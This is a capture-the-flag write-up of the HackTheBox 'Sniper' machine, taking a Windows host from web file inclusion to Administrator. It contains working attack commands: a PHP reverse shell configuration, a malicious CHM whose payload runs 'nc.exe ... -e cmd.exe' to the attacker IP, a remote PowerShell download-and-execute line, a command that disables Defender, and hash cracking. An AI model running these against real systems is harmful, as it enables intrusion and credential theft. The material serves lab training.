---
title: "Sniper Write-Up - HackTheBox"
description: "Medium Windows HackTheBox machine"
pubDatetime: 2024-01-02
draft: false
tags: ["windows", "htb", "media", "RFI", "port forwarding", "cracking"]
---

## Table of contents 

## Enumeration

Let's start with a quick TCP port scan with `nmap`:

~~~bash
❯ sudo /usr/bin/nmap -sS -p- --min-rate 3000 -n -Pn -vvv 10.10.10.151 -oG openPorts
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-01 18:12 CET
Initiating SYN Stealth Scan at 18:12
Scanning 10.10.10.151 [65535 ports]
Discovered open port 139/tcp on 10.10.10.151
Discovered open port 445/tcp on 10.10.10.151
Discovered open port 135/tcp on 10.10.10.151
Discovered open port 80/tcp on 10.10.10.151
Discovered open port 49667/tcp on 10.10.10.151
Completed SYN Stealth Scan at 18:12, 43.85s elapsed (65535 total ports)
Nmap scan report for 10.10.10.151
Host is up, received user-set (0.11s latency).
Scanned at 2024-01-01 18:12:01 CET for 44s
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 44.03 seconds
           Raw packets sent: 131096 (5.768MB) | Rcvd: 921 (217.398KB)
~~~

Let's start with the HTTP service.

## Port 80: HTTP

The main page is just a dashboard with many images where the only two working links redirect us to `http://10.10.10.151/blog/index.php` and to `http://10.10.10.151/user/login.php`.

![](@assets/HackTheBox/Sniper/1.png)

### RFI (Remote file inclusion)

In the blog one there is a functionality which allows us to change the page language:

![](@assets/HackTheBox/Sniper/2.png)

After seeing it the first thing I though was LFI so I jumped into trying different system routes and payloads.

I find that simply by introducing the full path to a file i can see its contents:

![](@assets/HackTheBox/Sniper/3.png)

I first tried log poisoning but after not finding any log files I though about turning it into a RFI instead of an LFI by sharing an SMB folder.

~~~bash
❯ sudo smbserver.py ziox . -smb2support
[sudo] password for ziox: 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.151,49694)
[*] AUTHENTICATE_MESSAGE (\,SNIPER)
[*] User SNIPER\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:ZIOX)
~~~

After accessing it I got a request from a device called `\SNIPER`, meaning that it worked.

As the server was interpreting PHP files I first shared the following file, in order to look if there were any disabled functions:

~~~php
<?php
    phpinfo();
?>
~~~

But there werent.

![](@assets/HackTheBox/Sniper/5.png)

So now i can upload a PHP reverse shell to gain access to the victim machine. For that purpose I will be using the following script: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

Here you only need to set this 4 variables and the arguments in the last lines when the function is called:

~~~php
private $addr  = "10.10.14.2";
private $port  = 1337;
private $os    = "WINDOWS";
private $shell = "cmd.exe";

$sh = new Shell('10.10.14.2', 1337);
$sh->run();
unset($sh);
~~~

After accessing it I receive a shell as `iis apppool\defaultapppool`.

![](@assets/HackTheBox/Sniper/7.png)

## Pivoting to Chris

There is only one user called `Chris` apart from the `Administrator`.

~~~cmd
C:\inetpub\wwwroot\user>dir c:\users\
 Volume in drive C has no label.
 Volume Serial Number is AE98-73A8

 Directory of c:\users

04/11/2019  06:04 AM    <DIR>          .
04/11/2019  06:04 AM    <DIR>          ..
04/09/2019  05:47 AM    <DIR>          Administrator
04/11/2019  06:04 AM    <DIR>          Chris
04/09/2019  05:47 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   2,370,813,952 bytes free
~~~

I found a file with some creds for a mysql database:

~~~cmd
C:\inetpub\wwwroot\user>type db.php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
~~~

But as mysql didnt seem to be installed I tried validating those creds for local users with `netexec`:

![](@assets/HackTheBox/Sniper/8.png)

It worked with the user `Chris`. But I cannot gain access as the machine doesnt have WinRM exposed by default.

Using `netstat` I discover that it is openly but internally. So I can use [`chisel`](https://github.com/jpillora/chisel) to perform a remote port forwarding in order to gain access as `Chris`.

I run up the server in my local machine.

~~~bash
❯ ./chisel server --reverse -p 1234
2024/01/01 20:26:22 server: Reverse tunnelling enabled
2024/01/01 20:26:22 server: Fingerprint 9iC67JpqKEh98zkcCLgaEpHfI0kZ64QfPsGd8IM5piA=
2024/01/01 20:26:22 server: Listening on http://0.0.0.0:1234
~~~

And in the victim one I run `chisel.exe` as a client.

>In order to execute it I downloaded the Windows 64-bit version from the repo and hosted it in the previouslu set SMB server.

~~~cmd
C:\inetpub\wwwroot\blog>\\10.10.14.2\ziox\chisel.exe client 10.10.14.2:1234 R:5985:127.0.0.1:5985
2024/01/01 20:16:48 client: Connecting to ws://10.10.14.2:1234
2024/01/01 20:16:54 client: Connected (Latency 854.9763ms)
~~~

Now I can access through WinRM using `evil-winrm` to the victim machine as `Chris`:

![](@assets/HackTheBox/Sniper/9.png)

From here we can get the first flag.

~~~powershell
*Evil-WinRM* PS C:\Users\Chris\desktop> type user.txt
837xxxxxxxxxxxxxxxxxxxxxxxxxxx
~~~

## Privilege escalation

With Chris I find an unusual directory (C:\Docs) in the root dir.

~~~powershell
*Evil-WinRM* PS C:\docs> ls


    Directory: C:\docs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/11/2019   9:31 AM            285 note.txt
-a----        4/11/2019   9:17 AM         552607 php for dummies-trial.pdf


*Evil-WinRM* PS C:\docs> type note.txt
Hi Chris,
	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.
~~~

This seems like a message sent to the `Chris` user from the Administrator (Sniper CEO). It says that he's expecting Chris to drop a file in this directory.

After investigating further I find a file with the extension `.chm` in the `Chris` Downloads folder:

~~~powershell
*Evil-WinRM* PS C:\users\chris\downloads> ls


    Directory: C:\users\chris\downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/11/2019   8:36 AM          10462 instructions.chm
~~~

>The CHM (Compiled HTML Help) file extension is used for files that contain help documentation in a compiled format. CHM files are commonly associated with Microsoft's HTML Help, a proprietary online help format introduced with Windows 98.

I believe this is the file type which the Administrator is expecting to be dropped at the `C:\Docs` folder.

So there might be a way to create a malicious `.chm` file so when he opens it triggers.

### Crafting malicious file

Looking for it I found the following nishang script: [https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1). Used to generate malicious `.chm` files which could be used to run PowerShell commands and scripts.

>In order to use this tool we need a Windows VM with **HTML Help Workshop** installed.

First we need to download the `.ps1` file:

~~~powershell
iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1")
~~~

>If the antivirus is blocking u from downloading the script, run `Set-MpPreference -DisableRealtimeMonitoring $true` to disable real-time protection.

And then generate the malicious with the desired payload:

~~~powershell
Out-CHM -Payload "\\10.10.14.2\ziox\nc.exe 10.10.14.2 4444 -e cmd.exe" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
~~~

![](@assets/HackTheBox/Sniper/10.png)

With this payload I will be accessing a shared `nc.exe` to send me a reverse shell over port 4444.

Now I transfer it to my local machine through the SMB server.

~~~powershell
PS C:\Users\fez\Desktop> copy .\doc.chm \\10.10.14.2\ziox\doc.chm
~~~

After that, transfer the file to the `C:\Docs` location with the evil-winrm `upload` feature.

~~~powershell
*Evil-WinRM* PS C:\Docs> upload ./doc.chm
                                        
Info: Uploading ./doc.chm to C:\Docs\doc.chm
                                        
Data: 17928 bytes of 17928 bytes copied
                                        
Info: Upload successful!
~~~

And wait for the Administrator to open it.

I didn't receive the shell, but I got the request from the Administrator to my SMB server, leaking his NetNTLMv2 hash, which I could try cracking:

![](@assets/HackTheBox/Sniper/11.png)

~~~bash
❯ john -w:/usr/share/seclists/rockyou.txt hash
Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
butterfly!#1     (Administrator)
1g 0:00:00:06 DONE (2024-01-01 22:26) 0.1620g/s 316659p/s 316659c/s 316659C/s byrd78..burlfire
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
~~~

Checking it with `netexec` I get **Pwn3d!** so I can use `psexec.py` to get a shell as Administrator.

~~~bash
❯ nxc smb 10.10.10.151 -u administrator -p 'butterfly!#1'
Using virtualenv: /usr/share/netexec/virtualenvs/netexec-PWU1S8Zj-py3.11
SMB         10.10.10.151    445    SNIPER           [*] Windows 10.0 Build 17763 x64 (name:SNIPER) (domain:Sniper) (signing:False) (SMBv1:False)
SMB         10.10.10.151    445    SNIPER           [+] Sniper\administrator:butterfly!#1 (Pwn3d!)
~~~

![](@assets/HackTheBox/Sniper/12.png)

